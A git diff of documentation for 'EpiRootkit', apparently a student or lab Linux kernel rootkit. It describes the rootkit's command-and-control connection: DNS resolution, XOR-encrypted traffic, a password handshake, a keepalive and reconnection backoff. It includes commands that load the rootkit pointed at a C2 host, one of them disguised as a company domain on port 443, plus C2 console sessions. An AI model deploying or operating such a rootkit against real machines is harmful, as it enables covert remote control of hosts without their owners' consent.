@@ -11,18 +11,18 @@ weight: 503
 
 # Connection & Authentication
 
-How EpiRootkit connects to the C2 server and handles authentication with **domain support**.
+How EpiRootkit connects to the C2 server and handles authentication with **domain support** and **XOR encryption**.
 
 ## Connection Process
 
-### Automatic Connection
 When the rootkit loads, it automatically:
 
 1. **Starts connection thread** (`epirootkit_conn`)
 2. **Resolves domain** (if address is domain name) - see [DNS Resolution](./features/dns-resolution.md)
 3. **Attempts TCP connection** to configured C2 server
 4. **Begins keepalive system** (60-second ping/pong)
-5. **Handles reconnection** with exponential backoff
+5. **Enables XOR encryption** for all C2 communication
+6. **Handles reconnection** with exponential backoff
 
 ### Configuration with Domain Support
 ```c
@@ -47,19 +47,6 @@ sudo ./deploy_rootkit.sh address=secure.company.net port=443
 sudo ./deploy_rootkit.sh address=10.0.0.100 port=8080
 ```
 
-## Network Architecture
-
-### Four-Layer System
-1. **DNS Resolution** - See [DNS Resolution](./features/dns-resolution.md) for details
-2. **Connection Management** (`connection.c`) - High-level coordination
-3. **Keepalive System** (`keepalive.c`) - Health monitoring
-4. **Socket Management** (`socket.c`) - Low-level network operations
-
-### Connection States
-- `0` = DISCONNECTED
-- `1` = CONNECTED  
-- `2` = CONNECTING
-
 ## Authentication System
 
 ### How It Works
@@ -80,7 +67,25 @@ sudo ./deploy_rootkit.sh address=10.0.0.100 port=8080
 - **Session timeout**: 1 hour automatic expiry
 - **Secure hashing**: SHA-512 using kernel crypto API
 
-## Live Demo with Domain Support
+## Keepalive System
+
+- **Ping interval**: Every 60 seconds
+- **Timeout detection**: 30 seconds for response
+- **Failure threshold**: 3 consecutive failed pings
+- **Automatic reconnection**: Exponential backoff (5s → 10s → 20s → 40s → 60s max)
+
+### Monitoring
+```bash
+# Check keepalive status from C2
+c2-server$ keepalive Client-1
+# Keepalive Status:
+# Last ping sent: 2025-05-25 16:14:00
+# Last pong received: 2025-05-25 16:14:00
+# Failed ping count: 0
+# Connection stable: YES
+```
+
+## Live Demo
 
 ### 1. Start C2 Server
 ```bash
@@ -102,63 +107,11 @@ sudo insmod epirootkit.ko address=c2.test-domain.com port=4444
 [2025-05-25 16:13:09] Client-1 status: UNAUTHENTICATED
 ```
 
-For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).
-
-### 3. Check Connection
-```bash
-c2-server$ clients
-# • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM
-```
-
-### 4. Authenticate
+### 3. Authenticate
 ```bash
 c2-server$ auth Client-1 password
 # ✓ [2025-05-25 16:13:29] Authenticated
 # SUCCESS: Authentication successful
 ```
 
-### 5. Verify Authentication
-```bash
-c2-server$ clients
-# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
-```
-
-## Keepalive System
-
-### Purpose
-- **Detect disconnections**: Network failures, system crashes
-- **Maintain connection**: Regular ping/pong messages
-- **Trigger reconnection**: When connection lost
-
-### How It Works
-- **Ping interval**: Every 60 seconds
-- **Timeout detection**: 30 seconds for response
-- **Failure threshold**: 3 consecutive failed pings
-- **Automatic reconnection**: Exponential backoff (5s → 10s → 20s → 40s → 60s max)
-
-### Monitoring
-```bash
-# Check keepalive status from C2
-c2-server$ keepalive Client-1
-# Keepalive Status:
-# Last ping sent: 2025-05-25 16:14:00
-# Last pong received: 2025-05-25 16:14:00
-# Failed ping count: 0
-# Connection stable: YES
-```
-
-## Reconnection Handling
-
-### Disconnection Detection
-1. **Socket-level**: Immediate network failures
-2. **Keepalive timeout**: No response to ping
-3. **Send failures**: Failed command results
-
-### Reconnection Process
-1. **Detect disconnection**
-2. **Wait with backoff**: 5s → 10s → 20s → 30s (max)
-3. **Attempt reconnection** (with DNS resolution if domain - see [DNS Resolution](./features/dns-resolution.md))
-4. **Reset authentication**: Must re-authenticate after reconnect
-5. **Resume operations**
-
-For DNS-aware reconnection details, see [DNS Resolution](./features/dns-resolution.md).
+For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).
